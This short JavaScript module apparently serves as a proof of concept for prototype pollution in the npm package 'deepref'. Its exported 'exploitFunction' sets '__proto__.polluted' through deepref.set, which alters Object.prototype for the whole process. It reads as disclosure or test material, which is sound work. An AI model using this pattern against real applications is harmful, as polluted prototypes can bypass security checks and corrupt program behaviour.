function exploitFunction(payload) {
    const deepref = require("deepref");
    deepref.set({}, "__proto__.polluted", "yes");
    return {};
}

module.exports = { exploitFunction };